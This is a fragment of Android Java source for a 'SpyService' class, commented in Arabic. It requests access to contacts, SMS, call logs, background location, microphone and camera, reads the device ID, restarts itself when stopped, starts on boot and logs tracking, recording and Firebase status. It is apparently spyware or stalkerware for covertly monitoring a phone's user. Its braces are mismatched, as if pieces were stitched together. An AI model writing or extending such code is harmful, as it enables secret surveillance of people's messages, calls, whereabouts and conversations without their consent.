        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        startService(new Intent(this, SpyService.class));
    }
}
    // ======================================================================
    // ========== دوال التحقق من الصلاحيات ==========
    // ======================================================================

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermissionsIfNeeded() {
        String[] permissions = {
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ANSWER_PHONE_CALLS,
                android.Manifest.permission.POST_NOTIFICATIONS
        };

        // إضافة صلاحيات Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.CALL_PHONE,
                    android.Manifest.permission.ANSWER_PHONE_CALLS,
                    android.Manifest.permission.POST_NOTIFICATIONS,
                    android.Manifest.permission.READ_MEDIA_IMAGES,
                    android.Manifest.permission.READ_MEDIA_VIDEO,
                    android.Manifest.permission.READ_MEDIA_AUDIO
            };
        }

        // طلب الصلاحيات من MainActivity عند الحاجة
        // يتم التعامل معها في MainActivity
    }

    // ======================================================================
    // ========== التشغيل التلقائي عند الإقلاع ==========
    // ======================================================================

    // يتم التعامل معها في BootReceiver.java
    // يجب أن يكون BootReceiver مسجلاً في AndroidManifest.xml

    // ======================================================================
    // ========== الحصول على معرف الجهاز الفريد ==========
    // ======================================================================

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    // ======================================================================
    // ========== التحقق من اتصال الإنترنت ==========
    // ======================================================================

    private boolean isInternetAvailable() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        } catch (Exception e) {
            return false;
        }
    }

    // ======================================================================
    // ========== دوال مساعدة لتنسيق البيانات ==========
    // ======================================================================

    private String formatDate(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }

    private String formatFileSize(long size) {
        if (size < 1024) return size + " B";
        if (size < 1024 * 1024) return String.format("%.2f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024) return String.format("%.2f MB", size / (1024.0 * 1024));
        return String.format("%.2f GB", size / (1024.0 * 1024 * 1024));
    }

    // ======================================================================
    // ========== إعادة تشغيل الخدمة في حالة التوقف ==========
    // ======================================================================

    private void restartService() {
        try {
            Intent restartIntent = new Intent(this, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
            Log.d(TAG, "🔄 تم إعادة تشغيل الخدمة");
        } catch (Exception e) {
            Log.e(TAG, "❌ فشل إعادة تشغيل الخدمة: " + e.getMessage());
        }
    }

    // ======================================================================
    // ========== دالة لطباعة حالة الخدمة ==========
    // ======================================================================

    private void logServiceStatus() {
        Log.d(TAG, "========================================");
        Log.d(TAG, "🔱 SpyService Status");
        Log.d(TAG, "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL);
        Log.d(TAG, "🤖 Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        Log.d(TAG, "🆔 Device ID: " + deviceId);
        Log.d(TAG, "🔋 Battery: " + getBatteryLevel() + "%");
        Log.d(TAG, "📶 Internet: " + (isInternetAvailable() ? "✅" : "❌"));
        Log.d(TAG, "📡 Firebase: " + (database != null ? "✅" : "❌"));
        Log.d(TAG, "📍 Location Tracking: " + (isTrackingLocation ? "🟢" : "🔴"));
        Log.d(TAG, "🎤 Recording: " + (isRecording ? "🟢" : "🔴"));
        Log.d(TAG, "========================================");
    }
}

}

